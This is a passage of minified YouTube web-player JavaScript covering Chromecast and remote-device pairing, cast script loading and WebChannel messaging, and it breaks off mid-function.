(function (g) {
  var window = this;
  'use strict';
  var $7 = function (a) {
      g.uo(a, "zx", Math.floor(2147483648 * Math.random()).toString(36) + Math.abs(Math.floor(2147483648 * Math.random()) ^ g.kb()).toString(36));
      return a;
    },
    a8 = function (a, b, c) {
      Array.isArray(c) || (c = [String(c)]);
      g.Jga(a.B, b, c);
    },
    axb = function (a) {
      if (a instanceof g.Us) return a;
      if ("function" == typeof a.Ck) return a.Ck(!1);
      if (g.Za(a)) {
        var b = 0,
          c = new g.Us();
        c.next = function () {
          for (;;) {
            if (b >= a.length) return g.C2;
            if (b in a) return g.Vs(a[b++]);
            b++;
          }
        };
        return c;
      }
      throw Error("Not implemented");
    },
    bxb = function (a, b, c) {
      if (g.Za(a)) g.cc(a, b, c);else for (a = axb(a);;) {
        var d = a.next();
        if (d.done) break;
        b.call(c, d.value, void 0, a);
      }
    },
    cxb = function (a, b) {
      var c = [];
      bxb(b, function (d) {
        try {
          var e = g.jv.prototype.B.call(this, d, !0);
        } catch (f) {
          if ("Storage: Invalid value was encountered" == f) return;
          throw f;
        }
        void 0 === e ? c.push(d) : g.xla(e) && c.push(d);
      }, a);
      return c;
    },
    dxb = function (a, b) {
      cxb(a, b).forEach(function (c) {
        g.jv.prototype.remove.call(this, c);
      }, a);
    },
    exb = function (a) {
      if (a.ma) {
        if (a.ma.locationOverrideToken) return {
          locationOverrideToken: a.ma.locationOverrideToken
        };
        if (null != a.ma.latitudeE7 && null != a.ma.longitudeE7) return {
          latitudeE7: a.ma.latitudeE7,
          longitudeE7: a.ma.longitudeE7
        };
      }
      return null;
    },
    fxb = function (a, b) {
      g.Cb(a, b) || a.push(b);
    },
    gxb = function (a) {
      var b = 0,
        c;
      for (c in a) b++;
      return b;
    },
    hxb = function (a, b) {
      return g.hd(a, b);
    },
    ixb = function (a) {
      try {
        return g.Ra.JSON.parse(a);
      } catch (b) {}
      a = String(a);
      if (/^\s*$/.test(a) ? 0 : /^[\],:{}\s\u2028\u2029]*$/.test(a.replace(/\\["\\\/bfnrtu]/g, "@").replace(/(?:"[^"\\\n\r\u2028\u2029\x00-\x08\x0a-\x1f]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)[\s\u2028\u2029]*(?=:|,|]|}|$)/g, "]").replace(/(?:^|:|,)(?:[\s\u2028\u2029]*\[)+/g, ""))) try {
        return eval("(" + a + ")");
      } catch (b) {}
      throw Error("Invalid JSON string: " + a);
    },
    b8 = function (a) {
      if (g.Ra.JSON) try {
        return g.Ra.JSON.parse(a);
      } catch (b) {}
      return ixb(a);
    },
    jxb = function (a, b, c, d) {
      var e = new g.mo(null);
      a && g.no(e, a);
      b && g.oo(e, b);
      c && g.po(e, c);
      d && (e.C = d);
      return e;
    },
    kxb = function () {
      this.j = c8();
      this.j.Dk("/client_streamz/youtube/living_room/mdx/channel/opened", {
        Te: 3,
        Se: "channel_type"
      });
    },
    lxb = function (a, b) {
      a.j.Ql("/client_streamz/youtube/living_room/mdx/channel/opened", b);
    },
    mxb = function () {
      this.j = c8();
      this.j.Dk("/client_streamz/youtube/living_room/mdx/channel/closed", {
        Te: 3,
        Se: "channel_type"
      });
    },
    nxb = function (a, b) {
      a.j.Ql("/client_streamz/youtube/living_room/mdx/channel/closed", b);
    },
    oxb = function () {
      this.j = c8();
      this.j.Dk("/client_streamz/youtube/living_room/mdx/channel/message_received", {
        Te: 3,
        Se: "channel_type"
      });
    },
    pxb = function (a, b) {
      a.j.Ql("/client_streamz/youtube/living_room/mdx/channel/message_received", b);
    },
    qxb = function () {
      this.j = c8();
      this.j.Dk("/client_streamz/youtube/living_room/mdx/channel/error", {
        Te: 3,
        Se: "channel_type"
      });
    },
    rxb = function (a, b) {
      a.j.Ql("/client_streamz/youtube/living_room/mdx/channel/error", b);
    },
    sxb = function () {
      this.j = c8();
      this.j.Dk("/client_streamz/youtube/living_room/mdx/browser_channel/pending_maps");
    },
    txb = function () {
      this.j = c8();
      this.j.Dk("/client_streamz/youtube/living_room/mdx/browser_channel/undelivered_maps");
    },
    d8 = function (a) {
      this.name = this.id = "";
      this.clientName = "UNKNOWN_INTERFACE";
      this.app = "";
      this.type = "REMOTE_CONTROL";
      this.obfuscatedGaiaId = this.avatar = this.username = "";
      this.capabilities = new Set();
      this.compatibleSenderThemes = new Set();
      this.experiments = new Set();
      this.theme = "u";
      new g.Su();
      this.model = this.brand = "";
      this.year = 0;
      this.chipset = this.osVersion = this.os = "";
      this.mdxDialServerType = "MDX_DIAL_SERVER_TYPE_UNKNOWN";
      a && (this.id = a.id || a.name, this.name = a.name, this.clientName = a.clientName ? a.clientName.toUpperCase() : "UNKNOWN_INTERFACE", this.app = a.app, this.type = a.type || "REMOTE_CONTROL", this.username = a.user || "", this.avatar = a.userAvatarUri || "", this.obfuscatedGaiaId = a.obfuscatedGaiaId || "", this.theme = a.theme || "u", uxb(this, a.capabilities || ""), vxb(this, a.compatibleSenderThemes || ""), wxb(this, a.experiments || ""), this.brand = a.brand || "", this.model = a.model || "", this.year = a.year || 0, this.os = a.os || "", this.osVersion = a.osVersion || "", this.chipset = a.chipset || "", this.mdxDialServerType = a.mdxDialServerType || "MDX_DIAL_SERVER_TYPE_UNKNOWN", a = a.deviceInfo) && (a = JSON.parse(a), this.brand = a.brand || "", this.model = a.model || "", this.year = a.year || 0, this.os = a.os || "", this.osVersion = a.osVersion || "", this.chipset = a.chipset || "", this.clientName = a.clientName ? a.clientName.toUpperCase() : "UNKNOWN_INTERFACE", this.mdxDialServerType = a.mdxDialServerType || "MDX_DIAL_SERVER_TYPE_UNKNOWN");
    },
    uxb = function (a, b) {
      a.capabilities.clear();
      g.Zs(b.split(","), g.gb(hxb, xxb)).forEach(function (c) {
        a.capabilities.add(c);
      });
    },
    vxb = function (a, b) {
      a.compatibleSenderThemes.clear();
      g.Zs(b.split(","), g.gb(hxb, yxb)).forEach(function (c) {
        a.compatibleSenderThemes.add(c);
      });
    },
    wxb = function (a, b) {
      a.experiments.clear();
      b.split(",").forEach(function (c) {
        a.experiments.add(c);
      });
    },
    e8 = function (a) {
      a = a || {};
      this.name = a.name || "";
      this.id = a.id || a.screenId || "";
      this.token = a.token || a.loungeToken || "";
      this.uuid = a.uuid || a.dialId || "";
      this.idType = a.screenIdType || "normal";
    },
    f8 = function (a, b) {
      return !!b && (a.id == b || a.uuid == b);
    },
    zxb = function (a) {
      return {
        name: a.name,
        screenId: a.id,
        loungeToken: a.token,
        dialId: a.uuid,
        screenIdType: a.idType
      };
    },
    Axb = function (a) {
      return new e8(a);
    },
    Bxb = function (a) {
      return Array.isArray(a) ? g.lr(a, Axb) : [];
    },
    g8 = function (a) {
      return a ? '{name:"' + a.name + '",id:' + a.id.substr(0, 6) + "..,token:" + ((a.token ? ".." + a.token.slice(-6) : "-") + ",uuid:" + (a.uuid ? ".." + a.uuid.slice(-6) : "-") + ",idType:" + a.idType + "}") : "null";
    },
    Cxb = function (a) {
      return Array.isArray(a) ? "[" + g.lr(a, g8).join(",") + "]" : "null";
    },
    Dxb = function () {
      return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (a) {
        var b = 16 * Math.random() | 0;
        return ("x" == a ? b : b & 3 | 8).toString(16);
      });
    },
    Exb = function (a) {
      return g.lr(a, function (b) {
        return {
          key: b.id,
          name: b.name
        };
      });
    },
    Fxb = function (a, b) {
      return g.zb(a, function (c) {
        return c || b ? !c != !b ? !1 : c.id == b.id : !0;
      });
    },
    h8 = function (a, b) {
      return g.zb(a, function (c) {
        return f8(c, b);
      });
    },
    Gxb = function () {
      var a = (0, g.MC)();
      a && dxb(a, a.j.Ck(!0));
    },
    i8 = function () {
      var a = g.OC("yt-remote-connected-devices") || [];
      g.Xb(a);
      return a;
    },
    Hxb = function (a) {
      if (0 == a.length) return [];
      var b = a[0].indexOf("#"),
        c = -1 == b ? a[0] : a[0].substring(0, b);
      return g.lr(a, function (d, e) {
        return 0 == e ? d : d.substring(c.length);
      });
    },
    Ixb = function (a) {
      g.NC("yt-remote-connected-devices", a, 86400);
    },
    j8 = function () {
      if (Jxb) return Jxb;
      var a = g.OC("yt-remote-device-id");
      a || (a = Dxb(), g.NC("yt-remote-device-id", a, 31536E3));
      for (var b = i8(), c = 1, d = a; g.Cb(b, d);) c++, d = a + "#" + c;
      return Jxb = d;
    },
    Kxb = function () {
      var a = i8(),
        b = j8();
      g.QC() && g.Zb(a, b);
      a = Hxb(a);
      if (0 == a.length) try {
        g.xoa("remote_sid");
      } catch (c) {} else try {
        g.eC("remote_sid", a.join(","), -1);
      } catch (c) {}
    },
    Lxb = function () {
      return g.OC("yt-remote-session-browser-channel");
    },
    Mxb = function () {
      return g.OC("yt-remote-local-screens") || [];
    },
    Nxb = function () {
      g.NC("yt-remote-lounge-token-expiration", !0, 86400);
    },
    Oxb = function (a) {
      5 < a.length && (a = a.slice(a.length - 5));
      var b = g.lr(Mxb(), function (d) {
          return d.loungeToken;
        }),
        c = g.lr(a, function (d) {
          return d.loungeToken;
        });
      g.mr(c, function (d) {
        return !g.Cb(b, d);
      }) && Nxb();
      g.NC("yt-remote-local-screens", a, 31536E3);
    },
    k8 = function (a) {
      a || (g.PC("yt-remote-session-screen-id"), g.PC("yt-remote-session-video-id"));
      Kxb();
      a = i8();
      g.Fb(a, j8());
      Ixb(a);
    },
    Pxb = function () {
      if (!l8) {
        var a = g.tv();
        a && (l8 = new g.gv(a));
      }
    },
    Qxb = function () {
      Pxb();
      return l8 ? !!l8.get("yt-remote-use-staging-server") : !1;
    },
    m8 = function (a, b) {
      g.AE[a] = !0;
      var c = g.yE();
      c && c.publish.apply(c, arguments);
      g.AE[a] = !1;
    },
    Rxb = function () {},
    c8 = function () {
      if (!n8) {
        n8 = new g.pg(new Rxb());
        var a = g.BB("client_streamz_web_flush_count", -1);
        -1 !== a && (n8.D = a);
      }
      return n8;
    },
    Sxb = function () {
      var a = window.navigator.userAgent.match(/Chrome\/([0-9]+)/);
      return a ? parseInt(a[1], 10) : 0;
    },
    Txb = function (a) {
      return !!document.currentScript && (-1 != document.currentScript.src.indexOf("?" + a) || -1 != document.currentScript.src.indexOf("&" + a));
    },
    Uxb = function () {
      return "function" == typeof window.__onGCastApiAvailable ? window.__onGCastApiAvailable : null;
    },
    o8 = function (a) {
      a.length ? Vxb(a.shift(), function () {
        o8(a);
      }) : Wxb();
    },
    Xxb = function (a) {
      return "chrome-extension://" + a + "/cast_sender.js";
    },
    Vxb = function (a, b, c) {
      var d = document.createElement("script");
      d.onerror = b;
      c && (d.onload = c);
      g.Nn(d, g.fw(a));
      (document.head || document.documentElement).appendChild(d);
    },
    Yxb = function () {
      var a = Sxb(),
        b = [];
      if (1 < a) {
        var c = a - 1;
        b.push("//www.gstatic.com/eureka/clank/" + a + "/cast_sender.js");
        b.push("//www.gstatic.com/eureka/clank/" + c + "/cast_sender.js");
      }
      return b;
    },
    Wxb = function () {
      var a = Uxb();
      a && a(!1, "No cast extension found");
    },
    $xb = function () {
      if (Zxb) {
        var a = 2,
          b = Uxb(),
          c = function () {
            a--;
            0 == a && b && b(!0);
          };
        window.__onGCastApiAvailable = c;
        Vxb("//www.gstatic.com/cast/sdk/libs/sender/1.0/cast_framework.js", Wxb, c);
      }
    },
    ayb = function () {
      $xb();
      var a = Yxb();
      a.push("//www.gstatic.com/eureka/clank/cast_sender.js");
      o8(a);
    },
    cyb = function () {
      $xb();
      var a = Yxb();
      a.push.apply(a, g.ra(byb.map(Xxb)));
      a.push("//www.gstatic.com/eureka/clank/cast_sender.js");
      o8(a);
    },
    p8 = function (a, b, c) {
      g.J.call(this);
      this.K = null != c ? (0, g.fb)(a, c) : a;
      this.Pi = b;
      this.G = (0, g.fb)(this.e2, this);
      this.j = !1;
      this.B = 0;
      this.C = this.hd = null;
      this.D = [];
    },
    q8 = function (a, b, c) {
      g.J.call(this);
      this.D = null != c ? a.bind(c) : a;
      this.Pi = b;
      this.C = null;
      this.j = !1;
      this.B = 0;
      this.hd = null;
    },
    dyb = function (a) {
      a.hd = g.ng(function () {
        a.hd = null;
        a.j && !a.B && (a.j = !1, dyb(a));
      }, a.Pi);
      var b = a.C;
      a.C = null;
      a.D.apply(null, b);
    },
    r8 = function () {},
    eyb = function () {
      g.wb.call(this, "p");
    },
    fyb = function () {
      g.wb.call(this, "o");
    },
    hyb = function () {
      return gyb = gyb || new g.Ed();
    },
    iyb = function (a) {
      g.wb.call(this, "serverreachability", a);
    },
    s8 = function (a) {
      var b = hyb();
      b.dispatchEvent(new iyb(b, a));
    },
    jyb = function (a) {
      g.wb.call(this, "statevent", a);
    },
    t8 = function (a) {
      var b = hyb();
      b.dispatchEvent(new jyb(b, a));
    },
    kyb = function (a, b, c, d) {
      g.wb.call(this, "timingevent", a);
      this.size = b;
      this.kB = d;
    },
    u8 = function (a, b) {
      if ("function" !== typeof a) throw Error("Fn must not be null and must be a function");
      return g.Ra.setTimeout(function () {
        a();
      }, b);
    },
    v8 = function () {},
    w8 = function (a, b, c, d) {
      this.G = a;
      this.D = b;
      this.Hc = c;
      this.jc = d || 1;
      this.gb = new g.$o(this);
      this.tb = 45E3;
      a = g.rS ? 125 : void 0;
      this.ob = new g.cg(a);
      this.Na = null;
      this.C = !1;
      this.Y = this.Za = this.Z = this.Sa = this.Aa = this.Jb = this.ma = null;
      this.qa = [];
      this.j = null;
      this.K = 0;
      this.N = this.Ea = null;
      this.Db = -1;
      this.Ka = !1;
      this.rb = 0;
      this.Ya = null;
      this.dc = this.Va = this.Nb = this.Fa = !1;
      this.B = new lyb();
    },
    lyb = function () {
      this.C = null;
      this.j = "";
      this.B = !1;
    },
    nyb = function (a, b, c) {
      a.Sa = 1;
      a.Z = $7(b.clone());
      a.Y = c;
      a.Fa = !0;
      myb(a, null);
    },
    myb = function (a, b) {
      a.Aa = Date.now();
      x8(a);
      a.Za = a.Z.clone();
      a8(a.Za, "t", a.jc);
      a.K = 0;
      var c = a.G.Sa;
      a.B = new lyb();
      a.j = oyb(a.G, c ? b : null, !a.Y);
      0 < a.rb && (a.Ya = new q8((0, g.fb)(a.cT, a, a.j), a.rb));
      a.gb.Ta(a.j, "readystatechange", a.l2);
      b = a.Na ? g.qd(a.Na) : {};
      a.Y ? (a.Ea || (a.Ea = "POST"), b["Content-Type"] = "application/x-www-form-urlencoded", a.j.send(a.Za, a.Ea, a.Y, b)) : (a.Ea = "GET", a.j.send(a.Za, a.Ea, null, b));
      s8(1);
    },
    pyb = function (a) {
      return a.j ? "GET" == a.Ea && 2 != a.Sa && a.G.Pe : !1;
    },
    uyb = function (a, b, c) {
      for (var d = !0, e; !a.Ka && a.K < c.length;) if (e = qyb(a, c), e == ryb) {
        4 == b && (a.N = 4, t8(14), d = !1);
        break;
      } else if (e == syb) {
        a.N = 4;
        t8(15);
        d = !1;
        break;
      } else tyb(a, e);
      pyb(a) && 0 != a.K && (a.B.j = a.B.j.slice(a.K), a.K = 0);
      4 != b || 0 != c.length || a.B.B || (a.N = 1, t8(16), d = !1);
      a.C = a.C && d;
      d ? 0 < c.length && !a.dc && (a.dc = !0, a.G.dQ(a)) : (y8(a), z8(a));
    },
    qyb = function (a, b) {
      var c = a.K,
        d = b.indexOf("\n", c);
      if (-1 == d) return ryb;
      c = Number(b.substring(c, d));
      if (isNaN(c)) return syb;
      d += 1;
      if (d + c > b.length) return ryb;
      b = b.slice(d, d + c);
      a.K = d + c;
      return b;
    },
    x8 = function (a) {
      a.Jb = Date.now() + a.tb;
      vyb(a, a.tb);
    },
    vyb = function (a, b) {
      if (null != a.ma) throw Error("WatchDog timer not null");
      a.ma = u8((0, g.fb)(a.f2, a), b);
    },
    A8 = function (a) {
      a.ma && (g.Ra.clearTimeout(a.ma), a.ma = null);
    },
    z8 = function (a) {
      a.G.eh() || a.Ka || wyb(a.G, a);
    },
    y8 = function (a) {
      A8(a);
      g.sb(a.Ya);
      a.Ya = null;
      a.ob.stop();
      a.gb.Lf();
      if (a.j) {
        var b = a.j;
        a.j = null;
        b.abort();
        b.dispose();
      }
    },
    tyb = function (a, b) {
      try {
        var c = a.G;
        if (0 != c.Ch && (c.j == a || xyb(c.B, a))) if (!a.Va && xyb(c.B, a) && 3 == c.Ch) {
          try {
            var d = c.Df.j.parse(b);
          } catch (x) {
            d = null;
          }
          if (Array.isArray(d) && 3 == d.length) {
            var e = d;
            if (0 == e[0]) a: {
              if (!c.Z) {
                if (c.j) if (c.j.Aa + 3E3 < a.Aa) B8(c), C8(c);else break a;
                yyb(c);
                t8(18);
              }
            } else c.ye = e[1], 0 < c.ye - c.Ya && 37500 > e[2] && c.Va && 0 == c.qa && !c.ma && (c.ma = u8((0, g.fb)(c.m2, c), 6E3));
            if (1 >= zyb(c.B) && c.jd) {
              try {
                c.jd();
              } catch (x) {}
              c.jd = void 0;
            }
          } else D8(c, 11);
        } else if ((a.Va || c.j == a) && B8(c), !g.gc(b)) for (e = c.Df.j.parse(b), b = 0; b < e.length; b++) {
          var f = e[b];
          c.Ya = f[0];
          f = f[1];
          if (2 == c.Ch) {
            if ("c" == f[0]) {
              c.D = f[1];
              c.dc = f[2];
              var h = f[3];
              null != h && (c.dT = h);
              var l = f[5];
              null != l && "number" === typeof l && 0 < l && (c.gb = 1.5 * l);
              d = c;
              var m = a.qO();
              if (m) {
                var n = g.Xm(m, "X-Client-Wire-Protocol");
                if (n) {
                  var p = d.B;
                  !p.j && (g.ic(n, "spdy") || g.ic(n, "quic") || g.ic(n, "h2")) && (p.D = p.G, p.j = new Set(), p.B && (Ayb(p, p.B), p.B = null));
                }
                if (d.Fa) {
                  var q = g.Xm(m, "X-HTTP-Session-Id");
                  q && (d.He = q, g.uo(d.Na, d.Fa, q));
                }
              }
              c.Ch = 3;
              c.G && c.G.jT();
              c.pd && (c.kd = Date.now() - a.Aa);
              d = c;
              var r = a;
              d.Ed = Byb(d, d.Sa ? d.dc : null, d.jc);
              if (r.Va) {
                Cyb(d.B, r);
                var t = r,
                  u = d.gb;
                u && t.setTimeout(u);
                t.ma && (A8(t), x8(t));
                d.j = r;
              } else Dyb(d);
              0 < c.C.length && E8(c);
            } else "stop" != f[0] && "close" != f[0] || D8(c, 7);
          } else 3 == c.Ch && ("stop" == f[0] || "close" == f[0] ? "stop" == f[0] ? D8(c, 7) : c.disconnect() : "noop" != f[0] && c.G && c.G.iT(f), c.qa = 0);
        }
        s8(4);
      } catch (x) {}
    },
    Eyb = function (a, b) {
      this.j = a;
      this.map = b;
      this.context = null;
    },
    Fyb = function (a) {
      this.G = a || 10;
      g.Ra.PerformanceNavigationTiming ? (a = g.Ra.performance.getEntriesByType("navigation"), a = 0 < a.length && ("hq" == a[0].nextHopProtocol || "h2" == a[0].nextHopProtocol)) : a = !!(g.Ra.chrome && g.Ra.chrome.loadTimes && g.Ra.chrome.loadTimes() && g.Ra.chrome.loadTimes().wasFetchedViaSpdy);
      this.D = a ? this.G : 1;
      this.j = null;
      1 < this.D && (this.j = new Set());
      this.B = null;
      this.C = [];
    },
    Gyb = function (a) {
      return a.B ? !0 : a.j ? a.j.size >= a.D : !1;
    },
    zyb = function (a) {
      return a.B ? 1 : a.j ? a.j.size : 0;
    },
    xyb = function (a, b) {
      return a.B ? a.B == b : a.j ? a.j.has(b) : !1;
    },
    Ayb = function (a, b) {
      a.j ? a.j.add(b) : a.B = b;
    },
    Cyb = function (a, b) {
      a.B && a.B == b ? a.B = null : a.j && a.j.has(b) && a.j.delete(b);
    },
    Hyb = function (a) {
      if (null != a.B) return a.C.concat(a.B.qa);
      if (null != a.j && 0 !== a.j.size) {
        var b = a.C;
        a = g.v(a.j.values());
        for (var c = a.next(); !c.done; c = a.next()) b = b.concat(c.value.qa);
        return b;
      }
      return g.Jb(a.C);
    },
    Iyb = function (a, b) {
      var c = new v8();
      if (g.Ra.Image) {
        var d = new Image();
        d.onload = g.gb(F8, c, d, "TestLoadImage: loaded", !0, b);
        d.onerror = g.gb(F8, c, d, "TestLoadImage: error", !1, b);
        d.onabort = g.gb(F8, c, d, "TestLoadImage: abort", !1, b);
        d.ontimeout = g.gb(F8, c, d, "TestLoadImage: timeout", !1, b);
        g.Ra.setTimeout(function () {
          if (d.ontimeout) d.ontimeout();
        }, 1E4);
        d.src = a;
      } else b(!1);
    },
    F8 = function (a, b, c, d, e) {
      try {
        b.onload = null, b.onerror = null, b.onabort = null, b.ontimeout = null, e(d);
      } catch (f) {}
    },
    Jyb = function () {
      this.j = new r8();
    },
    Kyb = function (a, b, c) {
      var d = c || "";
      try {
        g.lo(a, function (e, f) {
          var h = e;
          g.$a(e) && (h = g.Mm(e));
          b.push(d + f + "=" + encodeURIComponent(h));
        });
      } catch (e) {
        throw b.push(d + "type=" + encodeURIComponent("_badmap")), e;
      }
    },
    G8 = function (a, b, c) {
      return c && c.m7 ? c.m7[a] || b : b;
    },
    Lyb = function (a) {
      this.C = [];
      this.dc = this.Ed = this.Na = this.jc = this.j = this.He = this.Fa = this.Ka = this.N = this.Jb = this.Y = null;
      this.Rf = this.Za = 0;
      this.Pf = G8("failFast", !1, a);
      this.Va = this.ma = this.Z = this.K = this.G = null;
      this.Hc = !0;
      this.ye = this.Ya = -1;
      this.Nb = this.qa = this.Aa = 0;
      this.Of = G8("baseRetryDelayMs", 5E3, a);
      this.Sf = G8("retryDelaySeedMs", 1E4, a);
      this.Qf = G8("forwardChannelMaxRetries", 2, a);
      this.Pd = G8("forwardChannelRequestTimeoutMs", 2E4, a);
      this.Ge = a && a.Vjb || void 0;
      this.Pe = a && a.Sjb || !1;
      this.gb = void 0;
      this.Sa = a && a.Kba || !1;
      this.D = "";
      this.B = new Fyb(a && a.hhb);
      this.Df = new Jyb();
      this.tb = a && a.xhb || !1;
      this.rb = a && a.nhb || !1;
      this.tb && this.rb && (this.rb = !1);
      this.Tf = a && a.Ygb || !1;
      a && a.zhb && (this.Hc = !1);
      this.pd = !this.tb && this.Hc && a && a.lhb || !1;
      this.Od = void 0;
      a && a.eY && 0 < a.eY && (this.Od = a.eY);
      this.jd = void 0;
      this.kd = 0;
      this.ob = !1;
      this.Db = this.Ea = null;
    },
    C8 = function (a) {
      a.j && (Myb(a), a.j.cancel(), a.j = null);
    },
    Nyb = function (a) {
      C8(a);
      a.Z && (g.Ra.clearTimeout(a.Z), a.Z = null);
      B8(a);
      a.B.cancel();
      a.K && ("number" === typeof a.K && g.Ra.clearTimeout(a.K), a.K = null);
    },
    E8 = function (a) {
      Gyb(a.B) || a.K || (a.K = !0, g.Uf(a.fT, a), a.Aa = 0);
    },
    Pyb = function (a, b) {
      if (zyb(a.B) >= a.B.D - (a.K ? 1 : 0)) return !1;
      if (a.K) return a.C = b.qa.concat(a.C), !0;
      if (1 == a.Ch || 2 == a.Ch || a.Aa >= (a.Pf ? 0 : a.Qf)) return !1;
      a.K = u8((0, g.fb)(a.fT, a, b), Oyb(a, a.Aa));
      a.Aa++;
      return !0;
    },
    Ryb = function (a, b) {
      var c;
      b ? c = b.Hc : c = a.Za++;
      var d = a.Na.clone();
      g.uo(d, "SID", a.D);
      g.uo(d, "RID", c);
      g.uo(d, "AID", a.Ya);
      H8(a, d);
      a.N && a.Y && g.Zo(d, a.N, a.Y);
      c = new w8(a, a.D, c, a.Aa + 1);
      null === a.N && (c.Na = a.Y);
      b && (a.C = b.qa.concat(a.C));
      b = Qyb(a, c, 1E3);
      c.setTimeout(Math.round(.5 * a.Pd) + Math.round(.5 * a.Pd * Math.random()));
      Ayb(a.B, c);
      nyb(c, d, b);
    },
    H8 = function (a, b) {
      a.Ka && g.Wc(a.Ka, function (c, d) {
        g.uo(b, d, c);
      });
      a.G && g.lo({}, function (c, d) {
        g.uo(b, d, c);
      });
    },
    Qyb = function (a, b, c) {
      c = Math.min(a.C.length, c);
      var d = a.G ? (0, g.fb)(a.G.n2, a.G, a) : null;
      a: for (var e = a.C, f = -1;;) {
        var h = ["count=" + c];
        -1 == f ? 0 < c ? (f = e[0].j, h.push("ofs=" + f)) : f = 0 : h.push("ofs=" + f);
        for (var l = !0, m = 0; m < c; m++) {
          var n = e[m].j,
            p = e[m].map;
          n -= f;
          if (0 > n) f = Math.max(0, e[m].j - 100), l = !1;else try {
            Kyb(p, h, "req" + n + "_");
          } catch (q) {
            d && d(p);
          }
        }
        if (l) {
          d = h.join("&");
          break a;
        }
      }
      a = a.C.splice(0, c);
      b.qa = a;
      return d;
    },
    Dyb = function (a) {
      a.j || a.Z || (a.Nb = 1, g.Uf(a.eT, a), a.qa = 0);
    },
    yyb = function (a) {
      if (a.j || a.Z || 3 <= a.qa) return !1;
      a.Nb++;
      a.Z = u8((0, g.fb)(a.eT, a), Oyb(a, a.qa));
      a.qa++;
      return !0;
    },
    Myb = function (a) {
      null != a.Ea && (g.Ra.clearTimeout(a.Ea), a.Ea = null);
    },
    Syb = function (a) {
      a.j = new w8(a, a.D, "rpc", a.Nb);
      null === a.N && (a.j.Na = a.Y);
      a.j.rb = 0;
      var b = a.Ed.clone();
      g.uo(b, "RID", "rpc");
      g.uo(b, "SID", a.D);
      g.uo(b, "AID", a.Ya);
      g.uo(b, "CI", a.Va ? "0" : "1");
      !a.Va && a.Od && g.uo(b, "TO", a.Od);
      g.uo(b, "TYPE", "xmlhttp");
      H8(a, b);
      a.N && a.Y && g.Zo(b, a.N, a.Y);
      a.gb && a.j.setTimeout(a.gb);
      var c = a.j;
      a = a.dc;
      c.Sa = 1;
      c.Z = $7(b.clone());
      c.Y = null;
      c.Fa = !0;
      myb(c, a);
    },
    B8 = function (a) {
      null != a.ma && (g.Ra.clearTimeout(a.ma), a.ma = null);
    },
    wyb = function (a, b) {
      var c = null;
      if (a.j == b) {
        B8(a);
        Myb(a);
        a.j = null;
        var d = 2;
      } else if (xyb(a.B, b)) c = b.qa, Cyb(a.B, b), d = 1;else return;
      if (0 != a.Ch) if (b.C) {
        if (1 == d) {
          c = b.Y ? b.Y.length : 0;
          b = Date.now() - b.Aa;
          var e = a.Aa;
          d = hyb();
          d.dispatchEvent(new kyb(d, c, b, e));
          E8(a);
        } else Dyb(a);
      } else {
        var f = b.Db;
        e = b.getLastError();
        if (3 == e || 0 == e && 0 < f || !(1 == d && Pyb(a, b) || 2 == d && yyb(a))) switch (c && 0 < c.length && (b = a.B, b.C = b.C.concat(c)), e) {
          case 1:
            D8(a, 5);
            break;
          case 4:
            D8(a, 10);
            break;
          case 3:
            D8(a, 6);
            break;
          default:
            D8(a, 2);
        }
      }
    },
    Oyb = function (a, b) {
      var c = a.Of + Math.floor(Math.random() * a.Sf);
      a.isActive() || (c *= 2);
      return c * b;
    },
    D8 = function (a, b) {
      if (2 == b) {
        var c = null;
        a.G && (c = null);
        var d = (0, g.fb)(a.Qba, a);
        c || (c = new g.mo("//www.google.com/images/cleardot.gif"), g.Ra.location && "http" == g.Ra.location.protocol || g.no(c, "https"), $7(c));
        Iyb(c.toString(), d);
      } else t8(2);
      a.Ch = 0;
      a.G && a.G.hT(b);
      Tyb(a);
      Nyb(a);
    },
    Tyb = function (a) {
      a.Ch = 0;
      a.Db = [];
      if (a.G) {
        var b = Hyb(a.B);
        if (0 != b.length || 0 != a.C.length) g.Kb(a.Db, b), g.Kb(a.Db, a.C), a.B.C.length = 0, g.Jb(a.C), a.C.length = 0;
        a.G.gT();
      }
    },
    Uyb = function (a) {
      if (0 == a.Ch) return a.Db;
      var b = [];
      g.Kb(b, Hyb(a.B));
      g.Kb(b, a.C);
      return b;
    },
    Byb = function (a, b, c) {
      var d = g.vo(c);
      "" != d.j ? (b && g.oo(d, b + "." + d.j), g.po(d, d.D)) : (d = g.Ra.location, d = jxb(d.protocol, b ? b + "." + d.hostname : d.hostname, +d.port, c));
      b = a.Fa;
      c = a.He;
      b && c && g.uo(d, b, c);
      g.uo(d, "VER", a.dT);
      H8(a, d);
      return d;
    },
    oyb = function (a, b, c) {
      if (b && !a.Sa) throw Error("Can't create secondary domain capable XhrIo object.");
      b = a.Pe && !a.Ge ? new g.Qm(new g.ho({
        D_: c
      })) : new g.Qm(a.Ge);
      b.K = a.Sa;
      return b;
    },
    Vyb = function () {},
    Wyb = function () {
      if (g.af && !g.Rc(10)) throw Error("Environmental error: no available transport.");
    },
    J8 = function (a, b) {
      g.Ed.call(this);
      this.j = new Lyb(b);
      this.G = a;
      this.B = b && b.b8 || null;
      a = b && b.a8 || null;
      b && b.fhb && (a ? a["X-Client-Protocol"] = "webchannel" : a = {
        "X-Client-Protocol": "webchannel"
      });
      this.j.Y = a;
      a = b && b.wib || null;
      b && b.mY && (a ? a["X-WebChannel-Content-Type"] = b.mY : a = {
        "X-WebChannel-Content-Type": b.mY
      });
      b && b.BV && (a ? a["X-WebChannel-Client-Profile"] = b.BV : a = {
        "X-WebChannel-Client-Profile": b.BV
      });
      this.j.Jb = a;
      (a = b && b.vib) && !g.gc(a) && (this.j.N = a);
      this.K = b && b.Kba || !1;
      this.D = b && b.tjb || !1;
      (b = b && b.i7) && !g.gc(b) && (this.j.Fa = b, g.gd(this.B, b) && g.kd(this.B, b));
      this.C = new I8(this);
    },
    Xyb = function (a) {
      eyb.call(this);
      a.__headers__ && (this.headers = a.__headers__, this.statusCode = a.__status__, delete a.__headers__, delete a.__status__);
      var b = a.__sm__;
      b ? this.data = (this.j = g.ad(b)) ? g.ld(b, this.j) : b : this.data = a;
    },
    Yyb = function (a) {
      fyb.call(this);
      this.status = 1;
      this.errorCode = a;
    },
    I8 = function (a) {
      this.j = a;
    },
    Zyb = function (a, b) {
      this.B = a;
      this.j = b;
    },
    $yb = function (a) {
      return Uyb(a.j).map(function (b) {
        b = b.map;
        "__data__" in b && (b = b.__data__, b = a.B.D ? ixb(b) : b);
        return b;
      });
    },
    K8 = function (a, b) {
